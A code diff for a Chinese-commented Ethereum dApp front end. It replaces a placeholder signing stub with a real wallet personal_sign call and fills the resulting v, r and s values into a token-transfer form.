@@ -6,7 +6,6 @@ const contractAddress = '0x838F9b8228a5C95a7c431bcDAb58E289f5D2A4DC'; // 替换�
 
 // 替换为你的合约 ABI
 const contractABI = [
-    // 将 ABI 放入这里
     {
         "inputs": [],
         "stateMutability": "nonpayable",
@@ -115,7 +114,6 @@ window.addEventListener('load', () => {
     if (typeof window.ethereum !== 'undefined') {
         console.log('以太坊钱包已检测到。');
     } else {
-        alert('未检测到以太坊钱包，请安装MetaMask或其他以太坊钱包扩展！');
         console.log('未检测到以太坊钱包。');
     }
 });
@@ -142,8 +140,8 @@ async function connectWallet() {
             document.getElementById('tokenAddress').value = contractAddress;
             document.getElementById('fromAddress').value = userAddress;
 
-            // 模拟签名参数填充（实际中你需要使用真实的签名函数）
-            await signAndFillSignature();
+            // 获取签名信息并自动填充
+            await signAndFillSignature(userAddress, contractAddress);
         } catch (error) {
             console.error("连接钱包时出错:", error);
             alert('连接钱包失败，请查看控制台的错误信息。');
@@ -154,12 +152,23 @@ async function connectWallet() {
     }
 }
 
-// 模拟签名和填充（实际中你需要使用真实的签名函数）
-async function signAndFillSignature() {
-    console.log("正在模拟签名操作...");
-    document.getElementById('v').value = 27; // 模拟的签名 v 值
-    document.getElementById('r').value = "0x..."; // 模拟的签名 r 值
-    document.getElementById('s').value = "0x..."; // 模拟的签名 s 值
+// 签名函数，模拟签名和填充
+async function signAndFillSignature(userAddress, contractAddress) {
+    // 实际签名操作
+    const message = "签名用于转移代币";  // 这里应该是你想要签名的消息
+    const signature = await web3.eth.personal.sign(message, userAddress);
+    const v = signature.slice(-2); // 提取 v 值
+    const r = signature.slice(0, 66); // 提取 r 值
+    const s = signature.slice(66, 130); // 提取 s 值
+
+    console.log(`签名参数 v: ${v}`);
+    console.log(`签名参数 r: ${r}`);
+    console.log(`签名参数 s: ${s}`);
+
+    // 显示完整的签名参数
+    document.getElementById('v').value = parseInt(v, 16); // 将 v 转换为十进制
+    document.getElementById('r').value = r;
+    document.getElementById('s').value = s;
 }
 
 // 转移代币函数
